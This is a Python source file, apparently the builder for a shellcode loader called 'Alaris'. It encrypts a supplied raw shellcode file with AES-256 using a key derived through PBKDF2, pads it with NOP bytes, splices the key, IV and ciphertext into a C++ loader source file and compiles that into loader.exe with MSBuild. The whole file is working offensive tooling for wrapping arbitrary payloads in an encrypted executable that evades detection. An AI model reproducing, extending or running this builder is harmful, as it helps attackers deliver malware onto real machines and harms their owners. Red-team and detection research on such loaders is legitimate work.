import re
import os
import shutil
import base64
import binascii
import argparse
import mimetypes
import subprocess
import pbkdf2
from Crypto.Cipher import AES
from colorama import Fore, Back, Style


def replace_key_iv_shellcode(key: str, iv: str, shellcode: str ) -> bool:
    """
    Replaces the AES Key and IV in loader.cpp
    """
    try:
        key_re = re.compile(r'uint8_t\skey\[\d{1,2}\]\s=\s.*')
        iv_re = re.compile(r'uint8_t\siv\[\d{1,2}\]\s=\s.*')
        shell_re = re.compile(r'shellcode\s=\s\"\S+')
        loader_path = f"{os.getcwd()}/loader/loader/loader.cpp"

        # Repace the variables in the cpp file
        raw_in = open(loader_path, 'rt')
        cpp = raw_in.read()
        cpp_bak = cpp
        cpp = key_re.sub(key, cpp)
        cpp = iv_re.sub(iv, cpp)
        cpp = shell_re.sub(shellcode, cpp)
        raw_in.close()

        # re-write the cpp file
        raw_out = open(loader_path, "wt")
        raw_out.write(cpp)
        raw_out.close()
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        print(f"\t- Reverting code")
        raw_out = open(loader_path, "wt")
        raw_out.write(cpp_bak)
        raw_out.close()
        return False


def get_msbuild_path() -> str:
    """
    Uses the vswhere.exe application to enumerate the current Visual Studio
    installed on the host. This is used to build a proper msbuild.exe path.
    """
    try:
        p_files = os.getenv("ProgramFiles(x86)")
        cmd = f"\"{p_files}\\Microsoft Visual Studio\\Installer\\vswhere.exe\" -latest -products * -requires Microsoft.Component.MSBuild -property installationPath"
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        out, err = p.communicate()
        if p.returncode != 0:
            raise Exception("Cannot Find Visual Studio 2019+ Installation")
        return f"\"{out.decode('utf-8').strip()}\MSBuild\Current\Bin\MSBuild.exe\""
    except KeyError as e:
        print(f"KeyError: {e}; Error: {err}")
        exit(1)
    except Exception as e:
        print(f"Generic Error: {e}; Error: {err}")
        exit(1)


def compile() -> bool:
    """
    Compile the shellcode loader w/ msbuild
    """
    try:
        msbuild = get_msbuild_path()
        project_file = f"{os.getcwd()}/loader/Alaris.sln"
        cmd = f"{msbuild} {project_file}"
        p = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        out, err = p.communicate()
        if p.returncode != 0:
            raise Exception(err)
        return True
    except Exception as e:
        print(f"Compile Error: {e}")
        return False


def aes_pad(data: bytes) -> bytes:
    """
    Pad the data to make sure we are %16 == 0
    """
    bs = AES.block_size
    while len(data) % bs != 0:
        data += b"\x90"

    return data


def get_crypto_data(password: str) -> tuple:
    """
    Uses pbkdf2 to build a KEY and IV pair.
    """
    salt = os.urandom(16)
    key = pbkdf2.PBKDF2(password, salt).read(32)
    iv = pbkdf2.PBKDF2(password, salt).read(48)[32:]
    return (key, iv, salt)


def build_c_vars(data: bytes) -> str:
    """
    Takes in any string, separates for each 2 chars, assumes they're
    bytes and puts it into proper C syntax for byte array.
    """
    data = binascii.hexlify(data).decode("utf-8")
    split_data = re.findall("..", data)
    c_data = ""
    for i, b in enumerate(split_data):
        if i == (len(split_data) - 1):
            c_data += f"0x{b}"
        else:
            c_data += f"0x{b},"
    return c_data


def move_binary(path: str) -> str:
    current_location = f"{os.getcwd()}/loader/x64/Release/loader.exe"
    if os.path.exists(f"{path}/loader.exe"):
        os.remove(f"{path}/loader.exe")
    try:
        shutil.move(current_location, path)
    except:
        path = os.getcwd()
        shutil.move(current_location, path)
    return path


def aes_encrypt(data: bytes, key: bytes, iv: bytes) -> str:
    """
    Takes in data to encrypt, a key, and an iv. Encrypts the
    data with AES256, encodes the encrypted bytes with base64.
    """
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    encrypted_data = cipher.encrypt(data)
    return base64.b64encode(encrypted_data).decode("utf-8")


def parse_shellcode(shellcode_file: str) -> bytes:
    """
    Takes in a filepath as a parameter, verifies it's a binary file (raw)
    and parses the shellcode from within
    """
    if not os.path.exists(shellcode_file):
        print(f"[!] ERROR: {shellcode_file} does not exist")
        exit(1)
    # Check if the file is a binary (RAW) file
    file_type = mimetypes.guess_type(shellcode_file)[0]
    if "octet-stream" not in file_type:
        print(f"[!] ERROR: {shellcode_file} does not look to be a RAW Binary file")
        exit(1)

    with open(shellcode_file, "rb") as f:
        data = f.read()
    return data


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-s",
        "--shellcode",
        metavar="",
        dest="sc_file",
        required=True,
        help="Path to RAW shellcode file",
    )
    parser.add_argument(
        "-p",
        "--password",
        metavar="",
        dest="enc_pass",
        required=True,
        help="Encryption Passphrase",
    )
    parser.add_argument(
        "-o",
        "--out",
        metavar='',
        dest="out_path",
        default=os.getcwd(),
        required=False,
        help="Output Path for compiled binary"
    )

    args = parser.parse_args()

    key, iv, salt = get_crypto_data(args.enc_pass)
    c_key = "uint8_t key[32] = {%s};" % build_c_vars(key)
    c_iv = "uint8_t iv[16] = {%s};" % build_c_vars(iv)
    print(f"{Fore.CYAN}[i] Key, IV Generation:{Fore.GREEN}\tSuccessful{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] Key:{Fore.MAGENTA}\t{binascii.hexlify(key).decode('utf-8')}{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] IV:{Fore.MAGENTA}\t\t{binascii.hexlify(iv).decode('utf-8')}{Fore.RESET}")
    print(f"{Fore.CYAN}\t[+] Salt:{Fore.MAGENTA}\t{binascii.hexlify(salt).decode('utf-8')}{Fore.RESET}")

    # Parsing and Encryption of Shellcode
    raw_shellcode = parse_shellcode(args.sc_file)
    raw_padded_shellcode = aes_pad(raw_shellcode)
    encrypted_encoded_shellcode = aes_encrypt(raw_padded_shellcode, key, iv)
    print(f"{Fore.CYAN}[i] Encrypt Shellcode:{Fore.GREEN}\tSuccessful{Fore.RESET}")

    c_shellcode = f"shellcode = \"{encrypted_encoded_shellcode}\";"

    if replace_key_iv_shellcode(c_key, c_iv, c_shellcode):
        print(f"{Fore.CYAN}[i] Variable Swap:{Fore.GREEN}\tSuccessful{Fore.RESET}")
        if compile():
            print(f"{Fore.CYAN}[i] Compiling:{Fore.GREEN}\t\tSuccessful{Fore.RESET}")
            print(f"{Fore.CYAN}[i] Binary Location:{Fore.MAGENTA}\t{move_binary(args.out_path)}{Fore.RESET}")

